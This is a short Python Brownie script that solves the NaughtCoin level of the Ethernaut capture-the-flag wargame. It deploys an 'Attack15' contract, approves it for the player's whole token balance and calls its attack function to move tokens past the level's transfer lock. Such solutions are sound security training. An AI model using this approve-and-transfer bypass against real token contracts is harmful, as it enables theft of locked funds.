from scripts.helpful_scripts import get_account
from brownie import web3, interface, Attack15, NaughtCoin


ETHERNAUT_INSTANCE = "0x1a6B4e0C97C707b06506B953d1A4568EB3c28cFA"
GAS_LIMIT = 600000
# SUPPLY = 1000000000000000000000000


def main():

    player = get_account()

    coin = NaughtCoin.at(ETHERNAUT_INSTANCE)

    balance = coin.balanceOf(player)
    print(f"\nBalance of contract = {balance}\n")

    attack = Attack15.deploy(ETHERNAUT_INSTANCE, {"from": player})
    coin.approve(attack.address, balance, {"from": player})
    attack.attack({"from": player})

    balance = coin.balanceOf(player)
    print(f"\nBalance of contract = {balance}\n")
